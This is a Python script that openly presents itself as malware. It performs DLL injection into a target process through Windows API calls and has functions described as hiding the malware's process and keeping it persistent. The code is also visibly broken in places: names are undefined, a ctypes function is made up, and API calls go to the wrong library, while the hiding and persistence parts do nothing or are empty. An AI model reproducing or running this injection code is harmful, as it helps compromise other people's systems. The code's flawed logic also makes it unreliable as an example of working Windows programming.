import os
import ctypes as ct

# Load kernel32 library and get the function addresses
kernel32 = ct.windll.kernel32

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [ct.c_ulong, ct.c_bool, ct.c_int]
OpenProcess.restype = ct.c_void_p

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [ct.c_void_p, ct.c_void_p, ct.c_char_p, ct.c_size_t, ct.POINTER(ct.c_size_t)]
WriteProcessMemory.restype = ct.c_bool

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [ct.c_void_p, ct.c_void_p, ct.c_size_t, ct.c_ulong, ct.c_ulong]
VirtualAllocEx.restype = ct.c_void_p

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = [ct.c_void_p, ct.c_void_p, ct.c_ulong, ct.c_void_p, ct.c_void_p, ct.c_ulong, ct.POINTER(ct.c_int)]
CreateRemoteThread.restype = ct.c_void_p

# Define necessary constants
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

kernel32.GetModuleHandleA.argtypes = [ct.c_char_p]
kernel32.GetModuleHandleA.restype = ct.c_void_p

kernel32.GetProcAddress.argtypes = [ct.c_void_p, ct.c_char_p]
kernel32.GetProcAddress.restype = ct.c_void_p

# Get the function addresses
LoadLibraryA = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")

# Create a buffer with the path of the payload DLL
dll_path = b"C:\\Payload.dll"
dll_path_buffer = ct.create_string_buffer(dll_path)

# Allocate memory in the target process and write the path to it
process_h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, 1)
alloc_mem = VirtualAllocEx(process_h, None, len(dll_path) + 1, 0x3000, 0x40)
WriteProcessMemory(process_h, alloc_mem, dll_path_buffer, len(dll_path), ct.POINTER(ct.c_size_t)())

# Create a remote thread to load the DLL
thread_id = ct.c_int()
CreateRemoteThread(process_h, None, 0, LoadLibraryA, alloc_mem, 0, byref(thread_id))

# Define necessary constants for process enumeration and filtering
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010

kernel32.OpenProcess.argtypes = [ct.c_ulong, ct.c_bool, ct.c_int]
kernel32.OpenProcess.restype = ct.c_void_p

OpenProcessToken = kernel32.OpenProcessToken
OpenProcessToken.argtypes = [ct.c_void_p, ct.c_ulong, ct.POINTER(ct.c_void_p)]
OpenProcessToken.restype = ct.c_bool

TOKEN_ADJUST_PRIVILEGES = 0x0020

kernel32.AdjustTokenPrivileges.argtypes = [ct.c_void_p, ct.c_bool, ct.POINTER(ct.c_ulong), ct.c_ulong, ct.c_void_p, ct.c_ulong]
kernel32.AdjustTokenPrivileges.restype = ct.c_bool

TOKEN_QUERY = 0x0008
GetProcessIdOfThread = kernel32.GetProcessIdOfThread.argtypes = [ct.c_int] 

# Function to get the list of running processes
def EnumProcesses():
    hSnap = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
    ProcessEntry32 = ct.create_structure(ct.c_char_p("PROCESSENTRY32"), "Size", ct.c_int(128))
    Process32First = kernel32.Process32First
    Process32First.argtypes = [ct.c_void_p, ct.POINTER(ProcessEntry32)]
    
    pe32 = ProcessEntry32()
    ret = []
    if Process32First(hSnap, byref(pe32)):
        while 1:
            ret.append(pe32.th32ProcessID)
            Process32Next = kernel32.Process32Next
            Process32Next.argtypes = [ct.c_void_p, ct.POINTER(ProcessEntry32)]
            
            if not Process32Next(hSnap, byref(pe32)):
                break
    kernel32.CloseHandle(hSnap)
    return ret

# Function to filter out the process based on its name
def FilterProcesses(processes):
    filtered = []
    for p in processes:
        hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, p)
        if not hProcess:
            continue
        
        # Get the executable file path of the process
        buffer = (ct.c_char * 1024)()
        kernel32.QueryFullProcessImageNameA.argtypes = [ct.c_void_p, ct.c_int, ct.c_char_p, ct.POINTER(ct.c_int)]
        
        if not kernel32.QueryFullProcessImageNameA(hProcess, 0, buffer, None):
            continue
        
        exec_path = (buffer[:ct.addressof(buffer.contents).value]).decode("utf-8")
        kernel32.CloseHandle(hProcess)
        
        # Filter out the malware process
        if os.path.basename(exec_path) == "Payload.dll":
            continue
        
        filtered.append(p)
    return filtered

# Function to hide the malware's own process from the user view
def HideSelf():
    token = ct.c_void_p()
    if not OpenProcessToken(kernel32.GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES, byref(token)):
        print("Failed to open token")
    
    adjusted = ct.create_string_buffer(ct.sizeof(ct.c_ulong) * 5)
    old_value = ct.create_string_buffer(ct.sizeof(ct.c_ulong) * 5)
    
    if not kernel32.AdjustTokenPrivileges(token, False, byref(adjusted), ct.sizeof(ct.c_ulong) * 5, None, None):
        print("Failed to adjust privileges")
    
    hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, os.getpid())
    if not hProcess:
        return
    
    # Get the process ID of the thread
    thread_id = ct.c_int()
    if not GetProcessIdOfThread(thread_id):
        print("Failed to get thread id")
    
    kernel32.CloseHandle(hProcess)

# Function to monitor system files and restore itself if its components are deleted
def Persist():
    # Code for file monitoring and restoration goes here
    
    pass

if __name__ == "__main__":
    processes = EnumProcesses()
    filtered_processes = FilterProcesses(processes)
    
    print("Filtered Processes:", filtered_processes)

    HideSelf()

    Persist()
